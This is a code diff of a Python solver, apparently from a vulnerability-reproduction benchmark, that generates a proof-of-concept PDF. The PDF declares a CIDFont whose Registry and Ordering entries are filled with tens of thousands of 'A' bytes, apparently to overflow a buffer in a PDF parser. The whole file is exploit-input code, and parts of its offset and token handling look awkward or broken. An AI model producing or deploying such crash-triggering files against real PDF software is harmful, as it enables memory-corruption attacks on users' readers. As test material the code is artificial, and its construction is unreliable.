@@ -1,90 +1,79 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        registry_len = 256
-        ordering_len = 256
-        registry_str = 'A' * registry_len
-        ordering_str = 'B' * ordering_len
-        cid_sys = f"<< /Registry ({registry_str}) /Ordering ({ordering_str}) /Supplement 0 >>"
+        chunk_size = 127
+        long_len = 39998  # Adjust to approximate total size around 80064 including overhead
+        registry_content = b'A' * long_len
+        ordering_content = b'A' * long_len
 
-        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"
+        def name_tokens(content: bytes) -> bytes:
+            tokens = []
+            for i in range(0, len(content), chunk_size):
+                chunk = content[i:i + chunk_size]
+                tokens.append(b'/' + chunk)
+            return b' '.join(tokens)
 
-        obj2_str = """2 0 obj
-<< /Type /Pages /Kids [3 0 R] /Count 1 /Resources << /Font << /F1 4 0 R >> >> >>
-endobj
+        reg_name = name_tokens(registry_content)
+        ord_name = name_tokens(ordering_content)
 
-"""
-        obj2 = obj2_str.encode('utf-8')
+        # Build PDF body parts
+        parts = []
 
-        obj3_str = """3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
-endobj
+        # Header
+        parts.append(b'%PDF-1.7\n%\xC2\xBB\xEF\xBF\xBD\xEF\xBF\xBD\n')
 
-"""
-        obj3 = obj3_str.encode('utf-8')
+        # Object 1: Catalog
+        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
+        parts.append(obj1)
 
-        obj4_str = """4 0 obj
-<< /Type /Font /Subtype /Type0 /BaseFont /TestCID /DescendantFonts [6 0 R] /Encoding /Identity-H >>
-endobj
+        # Object 2: Pages
+        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
+        parts.append(obj2)
 
-"""
-        obj4 = obj4_str.encode('utf-8')
+        # Object 3: Page
+        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 3 3] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n'
+        parts.append(obj3)
 
-        content_text = b"BT /F1 12 Tf 100 700 Td <01> Tj ET"
-        content_length = len(content_text)
-        obj5_str = f"""5 0 obj
-<< /Length {content_length} >>
-stream
-""" + content_text.decode('ascii') + """
-endstream
-endobj
+        # Object 4: Contents
+        obj4 = b'4 0 obj\n<< /Length 2 >>\nstream\n \nendstream\nendobj\n'
+        parts.append(obj4)
 
-"""
-        obj5 = obj5_str.encode('utf-8')
+        # Object 5: Type0 Font
+        obj5 = b'5 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /Dummy-CID /DescendantFonts [6 0 R] /Encoding /Identity-H >>\nendobj\n'
+        parts.append(obj5)
 
-        obj6_str = f"""6 0 obj
-<< /Type /Font /Subtype /CIDFontType0 /BaseFont /TestCID /CIDSystemInfo {cid_sys} /FontDescriptor 7 0 R /W [ 0 [1000] ] >>
-endobj
+        # Object 6: CIDFont
+        obj6 = b'6 0 obj\n<< /Type /Font /Subtype /CIDFontType0 /BaseFont /Dummy-CID /CIDSystemInfo 7 0 R /DW 1000 >>\nendobj\n'
+        parts.append(obj6)
 
-"""
-        obj6 = obj6_str.encode('utf-8')
+        # Up to here, compute offset for object 7
+        body_so_far = b''.join(parts)
+        offset_obj7 = len(body_so_far)
 
-        obj7_str = """7 0 obj
-<< /Type /FontDescriptor /FontName /TestCID /Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>
-endobj
+        # Object 7: CIDSystemInfo with long names
+        obj7_start = f'7 0 obj\n<< /Registry {reg_name.decode("latin-1", "replace")} /Ordering {ord_name.decode("latin-1", "replace")} /Supplement 0 >>\nendobj\n'.encode('latin-1')
+        obj7 = obj7_start
 
-"""
-        obj7 = obj7_str.encode('utf-8')
+        # Full body
+        body = body_so_far + obj7
+        offset_startxref = len(body)
 
-        body_parts = [b'%PDF-1.7\n']
-        offsets = [None] * 8
-        current_offset = len(body_parts[0])
-        offsets[1] = current_offset
-        body_parts.append(obj1)
-        current_offset += len(obj1)
-        offsets[2] = current_offset
-        body_parts.append(obj2)
-        current_offset += len(obj2)
-        offsets[3] = current_offset
-        body_parts.append(obj3)
-        current_offset += len(obj3)
-        offsets[4] = current_offset
-        body_parts.append(obj4)
-        current_offset += len(obj4)
-        offsets[5] = current_offset
-        body_parts.append(obj5)
-        current_offset += len(obj5)
-        offsets[6] = current_offset
-        body_parts.append(obj6)
-        current_offset += len(obj6)
-        offsets[7] = current_offset
-        body_parts.append(obj7)
-        body = b''.join(body_parts)
-        xref_offset = len(body)
-        xref_str = b'xref\n0 8\n'
-        xref_str += b'0000000000 65535 f \n'
-        for i in range(1, 8):
-            off = offsets[i]
-            xref_str += f'{off:010d}'.encode('ascii') + b' 00000 n \n'
-        trailer = b'trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n' + str(xref_offset).encode('ascii') + b'\n%%EOF\n'
-        poc = body + xref_str + trailer
-        return poc
+        # Xref section
+        # Objects: 0 (free), 1-7
+        xref_entries = [
+            b'0000000000 65535 f \n',
+            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n"):010d}'.encode() + b' 00000 n \n',
+            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1):010d}'.encode() + b' 00000 n \n',
+            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2):010d}'.encode() + b' 00000 n \n',
+            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2) + len(obj3):010d}'.encode() + b' 00000 n \n',
+            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2) + len(obj3) + len(obj4):010d}'.encode() + b' 00000 n \n',
+            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2) + len(obj3) + len(obj4) + len(obj5):010d}'.encode() + b' 00000 n \n',
+            f'{offset_obj7:010d}'.encode() + b' 00000 n \n'
+        ]
+        xref = b'xref\n0 8\n' + b''.join(xref_entries)
+
+        # Trailer
+        trailer = b'trailer\n<< /Size 8 /Root 1 0 R /Prev 0 >>\nstartxref\n' + str(offset_startxref).encode() + b'\n%%EOF'
+
+        # Full PDF
+        pdf = body + xref + trailer
+        return pdf
